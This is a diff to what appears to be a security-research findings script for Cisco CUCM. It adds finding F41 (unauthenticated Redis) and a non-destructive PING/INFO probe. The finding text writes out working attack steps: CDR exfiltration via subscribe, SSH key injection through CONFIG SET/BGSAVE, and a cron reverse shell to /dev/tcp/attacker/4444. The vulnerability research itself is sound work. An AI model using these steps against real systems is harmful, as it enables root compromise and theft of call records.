@@ -514,6 +514,26 @@ CUCM-F40 LOW: Test TrustManager in production UXL WAR — JVM-wide Axis fake TLS
          JVM property affects outbound Axis SOAP calls from UXL context, not inbound server TLS.
   CVSS: 3.7 Low AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
 
+CUCM-F41 CRITICAL: CMAS Redis unauthenticated on all interfaces — CDR exfil + file-write RCE
+  Component: cm-cmas RPM / /usr/local/cm/conf/redis.conf
+  Config (active, non-commented):
+    bind 0.0.0.0     ← listens on ALL interfaces
+    protected-mode no ← disables Redis safety net
+    port 6379         ← default port
+    # requirepass foobared  ← commented out — NO AUTHENTICATION
+  Data: CMAS Redis serves as pub/sub broker for MACDRSubscriber (CDRs), MACMSyslogSubscriber
+        (CUCM system logs), MAFilebeatSubscriber (Filebeat log stream).
+  Attack 1 — CDR exfil:
+    redis-cli -h <cucm_ip> subscribe cdr-events → real-time call records (caller/callee/duration)
+  Attack 2 — file-write to RCE via CONFIG SET:
+    CONFIG SET dir /root/.ssh/ → CONFIG SET dbfilename authorized_keys
+    SET key "\n\nssh-rsa AAAA...\n\n" → BGSAVE → SSH as root
+  Attack 3 — cron RCE:
+    CONFIG SET dir /var/spool/cron/ → CONFIG SET dbfilename root
+    SET cron_key "\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n" → BGSAVE
+  Amplifier: post-RCE accesses F3 key, Informix DB, CTL files, HAProxy socket (F38)
+  CVSS: 9.8 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
 === PENDING TASKS ===
 - ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
 - Nimbus JOSE+JWT CVE mapping for 4.23 build
@@ -524,7 +544,7 @@ CUCM-F40 LOW: Test TrustManager in production UXL WAR — JVM-wide Axis fake TLS
 - cm-ccm binary deep dive: SIP nonce generation, RADIUS auth, media crypto key exchange
 """
 
-VERSION = "3.0.0"
+VERSION = "3.1.0"
 
 import requests
 import urllib3
@@ -1271,6 +1291,57 @@ def check_srst_ctl_tls(host: str = None, port: int = 2444) -> dict:
     return evidence
 
 
+def check_cmas_redis(host: str = None, port: int = 6379) -> dict:
+    """CUCM-F41: Probe CMAS Redis for unauthenticated access.
+    Root cause: redis.conf ships with bind=0.0.0.0, protected-mode=no, no requirepass.
+    Redis serves as pub/sub for CDRs, CUCM syslogs, Filebeat streams.
+    CONFIG SET file-write enables SSH key injection or cron-based RCE."""
+    evidence = {
+        "finding": "CUCM-F41",
+        "severity": "CRITICAL",
+        "cvss": "9.8 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "config_file": "/usr/local/cm/conf/redis.conf",
+        "vulnerable_settings": {
+            "bind": "0.0.0.0",
+            "protected-mode": "no",
+            "port": 6379,
+            "requirepass": "NOT SET",
+        },
+        "data_exposed": [
+            "CDRs via MACDRSubscriber pub/sub channel",
+            "CUCM syslog via MACMSyslogSubscriber",
+            "Filebeat log stream via MAFilebeatSubscriber",
+        ],
+        "attack_vectors": [
+            "redis-cli -h <host> subscribe <cdr-channel> → real-time CDR exfil",
+            "CONFIG SET dir /root/.ssh/ + CONFIG SET dbfilename authorized_keys + SET + BGSAVE → SSH as root",
+            "CONFIG SET dir /var/spool/cron/ + CONFIG SET dbfilename root + SET cron job + BGSAVE → RCE",
+        ],
+    }
+    if host:
+        import socket
+        try:
+            with socket.create_connection((host, port), timeout=5) as s:
+                s.sendall(b"PING\r\n")
+                resp = s.recv(64)
+                if resp.startswith(b"+PONG"):
+                    s.sendall(b"INFO server\r\n")
+                    info = s.recv(2048).decode(errors="replace")
+                    redis_ver = next((l.split(":")[1].strip() for l in info.splitlines() if l.startswith("redis_version:")), "unknown")
+                    evidence["probe"] = {
+                        "host": host, "port": port,
+                        "authenticated": False,
+                        "pong": True,
+                        "redis_version": redis_ver,
+                        "status": "VULNERABLE — unauthenticated Redis responds to PING",
+                    }
+                else:
+                    evidence["probe"] = {"host": host, "port": port, "response": resp[:32].hex()}
+        except Exception as e:
+            evidence["probe"] = {"host": host, "port": port, "error": str(e)}
+    return evidence
+
+
 def full_findings_summary() -> str:
     """Return a printable summary of all CUCM RE findings."""
     findings = [
@@ -1314,6 +1385,7 @@ def full_findings_summary() -> str:
         ("CUCM-F38", "MEDIUM",  "HAProxy admin socket /var/run/haproxy.sock mode 666 level admin — any local user reads sessions, disables rate limits, drains backends"),
         ("CUCM-F39", "HIGH",    "SRST CTL client EasyX509TrustManager: checkServerTrusted() no-op — CTLSocket.tlsConnect() accepts any server cert; MitM → inject CTL → branch phones trust attacker CA → full phone estate MitM"),
         ("CUCM-F40", "LOW",     "CiscoSoapClientTestTrustManager (named Test) shipped in production UXLService.war; sets JVM-wide axis.socketSecureFactory=SunFakeTrustSocketFactory; checkClientTrusted() no-op"),
+        ("CUCM-F41", "CRITICAL","CMAS Redis bind=0.0.0.0 protected-mode=no no requirepass; pub/sub broker for CDRs+syslogs+filebeat; CONFIG SET file-write → SSH key injection or cron RCE"),
     ]
     lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
     for fid, sev, title in findings:
